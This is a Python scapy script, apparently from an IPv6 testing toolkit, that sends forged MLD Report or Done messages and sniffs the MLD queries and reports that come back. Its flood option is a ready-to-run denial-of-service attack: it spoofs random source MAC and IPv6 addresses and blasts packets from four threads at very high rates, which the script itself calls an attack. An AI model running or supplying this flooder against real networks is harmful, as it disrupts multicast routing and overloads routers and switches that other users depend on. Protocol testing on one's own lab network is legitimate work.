#!/usr/bin/env python3
import argparse
import logging
import multiprocessing
import random
import sys
import threading
from collections import Counter

import netifaces
import netifaces as ni
from scapy.arch import get_if_hwaddr
from scapy.layers.inet6 import IPv6, IPv6ExtHdrHopByHop, RouterAlert, ICMPv6MLReport, ICMPv6MLDone, ICMPv6MLQuery2, \
    ICMPv6MLReport2, ICMPv6MLDMultAddrRec, ICMPv6MLQuery
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp, sendpfast, sniff

from validate_parameters import is_valid_ipv6, is_valid_mac, is_valid_num, mac2ipv6, convert_flag, convert_mld


def parameter():
    parser = argparse.ArgumentParser(
        description="|> Sending MLD Report or MLD Done message to specific destination, with an option to flood the "
                    "target.")
    parser.add_argument("interface", nargs="?", help="the network interface to use from the sender.")
    parser.add_argument("-t", dest="type", action="store", choices=['report', 'done'], default='report',
                        help="the type of MLD message (Report or Done).")
    parser.add_argument("-smac", dest="source_mac", action="store",
                        help="the MAC address of sender (resolved from the interface if skipping).")
    parser.add_argument("-dmac", dest="destination_mac", action="store",
                        help="the MAC address of receiver (resolved from the interface if skipping).")
    parser.add_argument("-sip", dest="source_ip", action="store", help="the IPv6 address of sender (resolved from the"
                                                                       " interface if skipping).")
    parser.add_argument("-dip", dest="destination_ip", action="store", help="the IPv6 address of destination (ff02::2"
                                                                            " if skipping).")
    parser.add_argument("-mip", dest="multicast_ip", action="store",
                        help="the multicast address that host wants to join or leave.")
    parser.add_argument("-mrc", dest="max_response", action="store", type=int, default=0,
                        help="the maximum response delay specified in 1/1000 second (0 if skipping).")
    parser.add_argument("-n", dest="num_packets", action="store", type=int, default=1,
                        help="the number of packets to send.")
    parser.add_argument("-p", dest="period", action="store", type=int,
                        help="send the MLD message periodically every specified seconds.")
    parser.add_argument("-f", dest="flood", action="store", choices=['constant', 'random'],
                        help="flood the target with option: sending MLD messages using only the defined "
                             "source addresses (constant), or sending MLD messages with many random source "
                             "addresses (random)")
    args = parser.parse_args()

    # Increase the recursion limit when calling Python objects (used when lots of Extension headers - > 300 headers)
    sys.setrecursionlimit(10 ** 6)

    # Validate the input
    if len(sys.argv) <= 1:
        parser.print_help()
        sys.exit(1)

    # Validate the network interface
    if not args.interface:
        print("---> Network interface is required!!!")
        parser.print_help()
        sys.exit(1)
    interface_list = netifaces.interfaces()
    while True:
        if args.interface in interface_list:
            break
        else:
            print("---> The given interface is invalid. Try again!!!")
            sys.exit(1)

    # Validate the source IPv6 address
    if args.source_ip is None:
        length = len(ni.ifaddresses(args.interface)[ni.AF_INET6])
        args.source_ip = ni.ifaddresses(args.interface)[ni.AF_INET6][length - 1]['addr']
        args.source_ip = args.source_ip.replace("%", '')
        args.source_ip = args.source_ip.replace(args.interface, '')
    if args.source_ip is not None:
        if not is_valid_ipv6(args.source_ip):
            print("---> The given source IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the destination IPv6 address
    if args.destination_ip is None:
        args.destination_ip = "ff02::2"
    if args.destination_ip is not None:
        if not is_valid_ipv6(args.destination_ip):
            print("---> The given destination IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the source MAC address
    if args.source_mac is None:
        args.source_mac = get_if_hwaddr(args.interface)
    if args.source_mac is not None:
        if not is_valid_mac(args.source_mac):
            print("---> The given source MAC address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the destination MAC address
    if args.destination_mac is not None:
        if not is_valid_mac(args.destination_mac):
            print("---> The given destination MAC address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the multicast IPv6 address
    if args.multicast_ip is None:
        args.multicast_ip = "::"
    if args.multicast_ip is not None:
        if not is_valid_ipv6(args.multicast_ip):
            print("---> The given multicast address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the maximum response delay
    if args.max_response is not None:
        if not is_valid_num(args.max_response):
            print("---> The given maximum response delay is invalid. Try again!!!")
            sys.exit(1)

    # Validate the number of packets
    if args.num_packets is None:
        args.num_packets = 1
    if args.num_packets is not None:
        if not is_valid_num(args.num_packets):
            print("---> The given number of packets is invalid. Try again!!!")
            sys.exit(1)

    # Validate the period and flood
    if args.period is not None and args.flood is not None:
        print("---> Only one of two options (periodical sending, flooding) can exist. Try again!!!")
        sys.exit(1)
    if args.period is not None:
        if not is_valid_num(args.period):
            print("---> The given number of period is invalid. Try again!!!")
            sys.exit(1)

    # Turning off logging
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

    return args.interface, args.type, args.source_mac, args.destination_mac, args.source_ip, args.destination_ip, args.multicast_ip, args.max_response, args.num_packets, args.period, args.flood


def generate(interface, type, source_mac, destination_mac, source_ip, destination_ip, multicast_ip, max_response, num_packets, period, flood):
    # Generate packet
    if destination_mac is None:
        layer2 = Ether(src=source_mac)
    if destination_mac is not None:
        layer2 = Ether(src=source_mac, dst=destination_mac)
    layer3 = IPv6(src=source_ip, dst=destination_ip, hlim=1)
    HBH = IPv6ExtHdrHopByHop(options=RouterAlert(otype=5, optlen=2, value=0))

    if type == 'report':
        MLD = ICMPv6MLReport(mrd=max_response, mladdr=multicast_ip)
    if type == 'done':
        MLD = ICMPv6MLDone(mrd=max_response, mladdr=multicast_ip)
    packet1 = layer2 / layer3 / HBH / MLD

    if period is None and flood is None:
        print("Sending MLD " + type + " to destination: " + destination_ip)
        sendp(packet1 * num_packets, verbose=False, iface=interface)
    if period is not None:
        print("Sending MLD " + type + " every " + str(period) + "(s) to destination: " + destination_ip)
        pkts_list = []
        for i in range(num_packets):
            pkts_list.append(packet1)
        sendp(pkts_list, verbose=False, iface=interface, inter=period, loop=1)
    if flood is not None:
        pkt_list = []
        print("Flooding the destination: " + destination_ip + " with MLD messages (press Ctrl+C to "
                                                              "stop the attack).....")
        if flood == 'constant':
            for i in range(100):
                pkt_list.append(packet1)

        if flood == 'random':
            for i in range(50):
                random_mac = "02:01:00:%02x:%02x:%02x" % (random.randint(0, 255),
                                                          random.randint(0, 255),
                                                          random.randint(0, 255))
                source_ip = mac2ipv6(random_mac)
                layer2 = Ether(src=random_mac, dst="33:33:00:00:00:02")
                layer3 = IPv6(src=source_ip, dst=destination_ip, hlim=1)
                HBH = IPv6ExtHdrHopByHop(options=RouterAlert(otype=5, optlen=2, value=0))

                packet1 = layer2 / layer3 / HBH / MLD
                pkt_list.append(packet1)

        def send_packets(packet, iface):
            try:
                sendpfast(packet, mbps=60000, pps=30000, loop=5000000, iface=iface)
            except KeyboardInterrupt:
                pass

        threads = []
        for i in range(4):
            thread = threading.Thread(target=send_packets, args=(pkt_list, interface))
            threads.append(thread)
            thread.start()

        # wait for all threads to complete
        for thread in threads:
            thread.join()


def sniffing(interface, source_ip, max_response):
    # Define our Custom Action function
    packet_counts = Counter()

    def custom_action(packet):
        # Create tuple of Src/Dst in sorted order
        if packet[0][1].src != source_ip:
            if ICMPv6MLQuery in packet:
                key = tuple(sorted([packet[0][1].src, packet[0][1].dst]))
                packet_counts.update([key])
                print("+ Received MLD Query message number #" + str(sum(packet_counts.values())))
                print("     from IPv6 address: " + packet[0][1].src + " and MAC address: " + packet[0].src)
                print("     to multicast address: " + packet[0].mladdr + " and Maximum response delay: " + str(packet[0].mrd))
                print("-----------------------------------------------------------------------------------")
            if ICMPv6MLQuery2 in packet:
                key = tuple(sorted([packet[0][1].src, packet[0][1].dst]))
                packet_counts.update([key])
                print("+ Received MLDv2 Query message number #" + str(sum(packet_counts.values())))
                print("     from IPv6 address: " + packet[0][1].src + " and MAC address: " + packet[0].src)
                print("     Maximum Response Code: " + str(
                    packet[0].mrd) + ", Suppress Router-Side Processing: " + convert_flag(packet[0].S))
                print("     Querier's Robustness Variable: " + str(
                    packet[0].QRV) + ", and Querier's query interval code: " + str(packet[0].QQIC))
                print("-----------------------------------------------------------------------------------")
            if ICMPv6MLReport in packet:
                key = tuple(sorted([packet[0][1].src, packet[0][1].dst]))
                packet_counts.update([key])
                print("+ Received MLD Report message number #" + str(sum(packet_counts.values())))
                print("     from IPv6 address: " + packet[0][1].src + " and MAC address: " + packet[0].src)
                print("     being interested in the multicast address: " + packet[0].mladdr)
                print("-----------------------------------------------------------------------------------")
            if ICMPv6MLDone in packet:
                key = tuple(sorted([packet[0][1].src, packet[0][1].dst]))
                packet_counts.update([key])
                print("+ Received MLD Done message number #" + str(sum(packet_counts.values())))
                print("     from IPv6 address: " + packet[0][1].src + " and MAC address: " + packet[0].src)
                print("     leaving the multicast address: " + packet[0].mladdr)
                print("-----------------------------------------------------------------------------------")
            if ICMPv6MLReport2 in packet:
                key = tuple(sorted([packet[0][1].src, packet[0][1].dst]))
                packet_counts.update([key])
                print("+ Received MLDv2 Report message number #" + str(sum(packet_counts.values())))
                print("     from IPv6 address: " + packet[0][1].src + " and MAC address: " + packet[0].src)
                for i in range(packet[0][ICMPv6MLReport2].records_number):
                    print("     Record number " + str(i + 1) + ": " + convert_mld(
                        packet[0][ICMPv6MLDMultAddrRec][i].rtype) + " and multicast address: " +
                          packet[0][ICMPv6MLDMultAddrRec][i].dst)
                    print("             Sources: " + str(packet[0][ICMPv6MLDMultAddrRec][i].sources))
                print("-----------------------------------------------------------------------------------")

    # Setup sniff, filtering for IP traffic to see the result
    build_filter = "ip6"

    try:
        sniff(iface=interface, filter=build_filter, prn=custom_action, timeout=max_response)
    except KeyboardInterrupt:
        sys.exit(0)


def sniffing_forever(interface, source_ip, max_response):
    # Define our Custom Action function
    packet_counts = Counter()

    def custom_action(packet):
        # Create tuple of Src/Dst in sorted order
        if packet[0][1].src != source_ip:
            if ICMPv6MLQuery in packet:
                key = tuple(sorted([packet[0][1].src, packet[0][1].dst]))
                packet_counts.update([key])
                print("+ Received MLD Query message number #" + str(sum(packet_counts.values())))
                print("     from IPv6 address: " + packet[0][1].src + " and MAC address: " + packet[0].src)
                print("     to multicast address: " + packet[0].mladdr + " and Maximum response delay: " + str(packet[0].mrd))
                print("-----------------------------------------------------------------------------------")
            if ICMPv6MLQuery2 in packet:
                key = tuple(sorted([packet[0][1].src, packet[0][1].dst]))
                packet_counts.update([key])
                print("+ Received MLDv2 Query message number #" + str(sum(packet_counts.values())))
                print("     from IPv6 address: " + packet[0][1].src + " and MAC address: " + packet[0].src)
                print("     Maximum Response Code: " + str(
                    packet[0].mrd) + ", Suppress Router-Side Processing: " + convert_flag(packet[0].S))
                print("     Querier's Robustness Variable: " + str(
                    packet[0].QRV) + ", and Querier's query interval code: " + str(packet[0].QQIC))
                print("-----------------------------------------------------------------------------------")
            if ICMPv6MLReport in packet:
                key = tuple(sorted([packet[0][1].src, packet[0][1].dst]))
                packet_counts.update([key])
                print("+ Received MLD Report message number #" + str(sum(packet_counts.values())))
                print("     from IPv6 address: " + packet[0][1].src + " and MAC address: " + packet[0].src)
                print("     being interested in the multicast address: " + packet[0].mladdr)
                print("-----------------------------------------------------------------------------------")
            if ICMPv6MLDone in packet:
                key = tuple(sorted([packet[0][1].src, packet[0][1].dst]))
                packet_counts.update([key])
                print("+ Received MLD Done message number #" + str(sum(packet_counts.values())))
                print("     from IPv6 address: " + packet[0][1].src + " and MAC address: " + packet[0].src)
                print("     leaving the multicast address: " + packet[0].mladdr)
                print("-----------------------------------------------------------------------------------")
            if ICMPv6MLReport2 in packet:
                key = tuple(sorted([packet[0][1].src, packet[0][1].dst]))
                packet_counts.update([key])
                print("+ Received MLDv2 Report message number #" + str(sum(packet_counts.values())))
                print("     from IPv6 address: " + packet[0][1].src + " and MAC address: " + packet[0].src)
                for i in range(packet[0][ICMPv6MLReport2].records_number):
                    print("     Record number " + str(i + 1) + ": " + convert_mld(
                        packet[0][ICMPv6MLDMultAddrRec][i].rtype) + " and multicast address: " +
                          packet[0][ICMPv6MLDMultAddrRec][i].dst)
                    print("             Sources: " + str(packet[0][ICMPv6MLDMultAddrRec][i].sources))
                print("-----------------------------------------------------------------------------------")

    # Setup sniff, filtering for IP traffic to see the result
    build_filter = "ip6"

    try:
        sniff(iface=interface, filter=build_filter, prn=custom_action)
    except KeyboardInterrupt:
        sys.exit(0)


def execute_functions(interface, type, source_mac, destination_mac, source_ip, destination_ip, multicast_ip, max_response, num_packets, period, flood):
    p1 = multiprocessing.Process(target=generate,
                                 args=[interface, type, source_mac, destination_mac, source_ip, destination_ip, multicast_ip, max_response, num_packets, period, flood])
    p2 = multiprocessing.Process(target=sniffing, args=[interface, source_ip, max_response])
    p2.start()
    p1.start()
    p2.join()
    p1.join()


def execute_functions_forever(interface, type, source_mac, destination_mac, source_ip, destination_ip, multicast_ip, max_response, num_packets, period, flood):
    p1 = multiprocessing.Process(target=generate,
                                 args=[interface, type, source_mac, destination_mac, source_ip, destination_ip, multicast_ip, max_response, num_packets, period, flood])
    p2 = multiprocessing.Process(target=sniffing_forever, args=[interface, source_ip, max_response])
    p2.start()
    p1.start()
    p2.join()
    p1.join()


if __name__ == "__main__":
    interface, type, source_mac, destination_mac, source_ip, destination_ip, multicast_ip, max_response, num_packets, period, flood = parameter()
    if flood is None and period is None:
        try:
            execute_functions(interface, type, source_mac, destination_mac, source_ip, destination_ip, multicast_ip, max_response, num_packets, period, flood)
        except KeyboardInterrupt:
            sys.exit(0)
    elif period is not None:
        try:
            execute_functions_forever(interface, type, source_mac, destination_mac, source_ip, destination_ip, multicast_ip, max_response, num_packets, period, flood)
        except KeyboardInterrupt:
            sys.exit(0)
    else:
        try:
            generate(interface, type, source_mac, destination_mac, source_ip, destination_ip, multicast_ip, max_response, num_packets, period, flood)
        except KeyboardInterrupt:
            # If KeyboardInterrupt is raised in the main thread, stop all child threads
            threading.Event().set()
            sys.exit(0)
